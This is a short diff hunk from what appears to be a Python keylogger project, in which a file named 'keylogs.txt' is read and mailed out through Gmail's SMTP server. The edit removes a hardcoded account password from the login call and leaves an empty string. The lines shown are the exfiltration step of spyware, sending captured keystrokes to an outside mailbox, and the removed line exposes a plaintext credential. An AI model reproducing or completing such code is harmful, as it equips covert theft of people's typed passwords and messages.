@@ -52,6 +52,6 @@ with open('keylogs.txt', 'rb') as file:
 
 mail_server = smtplib.SMTP_SSL('smtp.gmail.com')
 mail_server.set_debuglevel(1)
-mail_server.login("pythonproject.py@gmail.com", 'Password56789')
+mail_server.login("pythonproject.py@gmail.com", '')
 mail_server.send_message(message)
 mail_server.quit()
